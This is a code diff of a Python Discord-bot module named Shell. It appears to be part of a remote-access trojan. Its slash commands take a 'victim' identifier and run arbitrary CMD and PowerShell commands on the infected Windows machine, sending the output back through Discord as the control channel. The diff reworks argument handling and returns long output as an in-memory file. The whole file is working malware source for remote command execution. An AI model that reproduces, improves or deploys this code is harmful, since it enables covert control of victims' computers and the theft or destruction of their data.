@@ -1,6 +1,7 @@
 import disnake as discord
 from disnake.ext import commands
 from datetime import datetime
+from io import BytesIO
 
 import os, requests, subprocess, time
 nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
@@ -8,17 +9,17 @@ nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
 class Shell(commands.Cog):
     def __init__(self, bot: commands.Bot):
         self.bot = bot
-        self.ip_addr = self.bot.ip_addr
         
-    @commands.slash_command(
-        description="Executes command prompt commands",
-        options=[
-            bot.victim,
-            discord.Option("command", description="The CMD command which will be executed", required=True),
-        ]
-    )
+    @commands.slash_command( )
     async def cmd(self, ctx, victim, command): 
-        if str(victim) == str(self.ip_addr):
+        """Executes command prompt commands
+        
+        Parameters
+        ----------
+        victim: Identifier of the affected computer (found via /listvictims).
+        command: The CMD command which will be executed
+        """
+        if str(victim) == str(self.bot.identifier):
             await ctx.response.defer()
             
             output = subprocess.run(
@@ -29,18 +30,17 @@ class Shell(commands.Cog):
                 stdout=subprocess.PIPE, 
             ).stdout.decode('utf-8')
             
-            if len(output) > 4095:
-                os.chdir(nr_working)
-                with open("output.txt", 'w+') as f:
-                    f.write(output)
-                await ctx.followup.send(
-                    f"Output for `{command}`:", 
-                    file = discord.File( "output.txt" )
+            if len(output) > 4095:  
+                output_bytes = BytesIO(
+                    bytes(
+                        output, 'utf-8'
+                    )   
                 )
-                time.sleep(2)
-                os.remove("output.txt")
-                os.chdir(self.bot.original_dir)
-                return None
+                return await ctx.followup.send(
+                    file = discord.File(
+                        output_bytes, filename = "output.txt"
+                    )   
+                )       
                 
             embed = self.bot.genEmbed(
                 f"Output for `{command}`:",
@@ -49,37 +49,37 @@ class Shell(commands.Cog):
             )
             await ctx.followup.send(embed=embed)
 
-    @commands.slash_command(
-        description="Executes Powershell commands",
-        options=[
-            bot.victim,
-            discord.Option("command", description="The PS command which will be executed", required=True),
-        ]
-    )
+    @commands.slash_command( )
     async def powershell(self, ctx, victim, command): 
-        if str(victim) == str(self.ip_addr):
+        """Executes powershell commands
+        
+        Parameters
+        ----------
+        victim: Identifier of the affected computer (found via /listvictims).
+        command: The PS command which will be executed
+        """
+        if str(victim) == str(self.bot.identifier):
             await ctx.response.defer()
             
             output = subprocess.run(
-                "powershell.exe " + command, 
+                "powershell.exe "+command, 
                 shell=True,
                 stdin=subprocess.PIPE, 
                 stderr=subprocess.PIPE,
                 stdout=subprocess.PIPE, 
             ).stdout.decode('utf-8')
             
-            if len(output) > 4095:
-                os.chdir(nr_working)
-                with open("output.txt", 'w+') as f:
-                    f.write(output)
-                await ctx.followup.send(
-                    f"Output for `{command}`:", 
-                    file = discord.File( "output.txt" )
+            if len(output) > 4095:  
+                output_bytes = BytesIO(
+                    bytes(
+                        output, 'utf-8'
+                    )   
                 )
-                time.sleep(2)
-                os.remove("output.txt")
-                os.chdir(self.bot.original_dir)
-                return None
+                return await ctx.followup.send(
+                    file = discord.File(
+                        output_bytes, filename = "output.txt"
+                    )   
+                )       
                 
             embed = self.bot.genEmbed(
                 f"Output for `{command}`:",
@@ -87,6 +87,7 @@ class Shell(commands.Cog):
                 f"```{output}```"
             )
             await ctx.followup.send(embed=embed)
+
             
 def setup(bot: commands.Bot):
     bot.add_cog(Shell(bot))
